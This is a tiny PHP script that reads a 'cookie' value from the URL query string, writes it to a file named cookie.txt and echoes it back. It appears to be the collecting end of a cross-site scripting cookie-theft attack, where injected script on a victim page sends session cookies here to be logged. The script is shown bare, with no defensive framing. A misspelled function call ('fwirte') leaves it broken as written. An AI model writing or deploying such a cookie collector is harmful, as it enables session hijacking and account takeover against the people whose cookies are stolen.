<?php
$cookie=$_GET['cookie'];
$myfile=fopen('cookie.txt','w+');
fwirte($myfile,$cookie);
fclose($myfile);

echo ($cookie);

?>